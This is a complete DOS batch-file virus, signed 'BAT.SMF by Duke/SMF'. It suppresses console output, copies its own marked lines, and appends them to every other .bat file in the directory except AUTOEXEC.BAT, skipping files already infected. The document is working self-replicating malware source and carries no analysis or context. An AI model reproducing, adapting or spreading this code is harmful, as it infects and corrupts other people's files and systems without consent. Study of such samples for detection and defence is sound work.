@ctty nul%SMF%
if "%1=="SMF goto SMFz
echo.>SMF
find "SMF"<%0>>SMF
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call %0 SMF %%b
del SMF
goto SMFe
:SMFz
find "SMF"<%2
if not errorlevel 1 goto SMFe
type SMF>>%2
:SMFe BAT.SMF by Duke/SMF
